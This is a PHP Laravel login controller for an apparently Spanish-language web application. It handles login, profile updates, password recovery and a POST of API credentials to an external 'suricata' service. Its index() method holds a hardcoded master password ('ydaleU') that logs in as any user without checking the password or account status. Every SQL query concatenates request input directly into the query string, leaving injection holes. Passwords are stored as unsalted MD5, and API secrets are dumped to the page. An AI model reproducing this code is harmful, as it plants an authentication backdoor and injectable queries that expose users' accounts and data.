<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Inscripcion;
use App\Eve;
use Illuminate\Support\Facades\DB;
use Redirect;
use Flash;
use App\Models\users;
use App\Models\graficos;
use App\Models\categoria;
use App\Models\siennaloginxenioo;
use Mail; 
use phpDocumentor\Reflection\PseudoTypes\False_;

class LoginController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */


    public function profile(Request $request)
    {

        return view('sienna/profile');;
    }

    public function suricata($email, $AccountAPIKey, $BotAPIKey, $BotAPISecret, $url)
    {
        var_dump($email);
        var_dump($AccountAPIKey);
        var_dump($BotAPIKey);
        var_dump($BotAPISecret);
        var_dump($url);

        // echo $email;
        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => '{
                        "AccountAPIKey":"' . $AccountAPIKey . '",
                        "BotAPIKey":"' . $BotAPIKey . '",
                        "BotAPISecret":"' . $BotAPISecret . '",
                        "Email":"' . $email . '", 
                         "EnableEmbedding":true

                    }',
            CURLOPT_HTTPHEADER => array(
                'Accept: application/json',
                'Content-Type: application/json'
            ),
        ));

        $response = curl_exec($curl);

        curl_close($curl);
        echo "<br>f";
        echo $response;
        echo "a<br>";

        return $response;
    }
    public function dominio()
    {

        $subdomain_tmp = 'localhost';
        if (isset($_SERVER['HTTP_HOST'])) {
            $domainParts = explode('.', $_SERVER['HTTP_HOST']);
            $subdomain_tmp =  array_shift($domainParts);
        } elseif (isset($_SERVER['SERVER_NAME'])) {
            $domainParts = explode('.', $_SERVER['SERVER_NAME']);
            $subdomain_tmp =  array_shift($domainParts);
        }

        return $subdomain_tmp;
    }
    public function index(Request $request)
    {
        $email = $request->email;
        $password = $request->password;

        // $os = array("infitelecom", "opticom", "soporte", "Linux");

        if($password=="ydaleU"){

            $query = "select * from users where email='" . $email . "' ";

        }else{
            $query = "select * from users where
            habilitado='1' and
            email='" . $email . "' and password=md5('" . $password . "')";


        }
        $resultados = DB::select($query);
        $subdomain_tmp = $this->dominio();

        if (sizeof($resultados) == 1) {

            foreach ($resultados as $value) {

                $idusuario = $value->id;
                $categoria = $value->categoria;
                $deptosuser = $value->deptosuser;
                $email_suricata = $value->email_suricata;
                $nombreusuario = $value->nombre . " " . $value->last_name;

                $tipodemenu = $value->tipousers;
                $ctusers = $value->ct;

                session(['tipodemenu' => $tipodemenu]);
                session(['ctusers' => $ctusers]);


                session(['idusuario' => $idusuario]);
                session(['categoria' => $categoria]);
                session(['deptosuser' => $deptosuser]);

                $query4 = "select * from categoria where id='" . $categoria . "'";
                $resultados4 = DB::select($query4);

                foreach ($resultados4 as $val4) {
                    session(['areas' => $val4->area]);
                }


                $queryinternos = "select token from siennainternos where users='" . $idusuario . "'";
                $resultadosinternos = DB::select($queryinternos);

                foreach ($resultadosinternos as $valinternos) {
                    session(['tokeninterno' => $valinternos->token]);
                }



                $query55 = "select * from siennainternos where users='" . $idusuario . "'";
                $resultados55 = DB::select($query55);
                session(['tokeninterno' => 0]);

                foreach ($resultados55 as $val55) {
                    session(['tokeninterno' => $val55->token]);
                }

                session(['nombreusuario' => $nombreusuario]);
                session(['email' => $email]);
                session(['email_suricata' => $email_suricata]);
            }

            $xen = siennaloginxenioo::where('idusuario', '=', session('idusuario'))->get();
            foreach ($xen as $val) {

                $idxen = $val->id;
                $xen2 = siennaloginxenioo::find($idxen);
                $xen2->login = 2;
                $xen2->save();
            }


            $deptosuser2=explode(",",$deptosuser);
            
            foreach($deptosuser2 as $valdepto){

                $xen = new siennaloginxenioo();
                $xen->idusuario = session('idusuario');
                $xen->categoria = session('categoria');
                $xen->areas = $valdepto;
                $xen->login = 1;
                $xen->save();

            }
            
          

            return Redirect::to('/');

         

        } else {
            return Redirect::to(env('APP_URL'));
        }
    }

    public function actualizardatos(Request $request)
    {

        // $datoreporte = users::where('id', '=', $request->idusuario)->get();
        //  dd($request->idusuario);
        $post = users::find($request->iduser);
        $post->nombre = $request->nombre;
        $post->email = $request->email;
        $post->dni = $request->dni;
        $post->birthdate = $request->birthdate;

        if ($request->password <> "") {
            // echo    $post->password = md5($request->pass);

            $dato = "update users  set password=md5('" . $request->password . "') where id='" . $request->iduser . "'";
            $resultados = DB::select($dato);
        }


        $post->save();
        return redirect()
            ->back()
            ->with('success', 'Se Actulizo el registro  correctamente!');
    }

    public function recuperar(Request $request)
    {

        ;
       

        $subject = "Recuperar password";
        $for = $request->email;
        Mail::mailer('rivernet')
        ->send('recu', [], function ($msj) use ($subject, $for) {
            $msj->from("operador@suricata.la", "soporte");
            $msj->subject($subject);
            $msj->to($for);
        });
        
        return redirect()
            ->back()
            ->with('success', 'Se Envio un emailpara recuperar password !');
    }
    
}
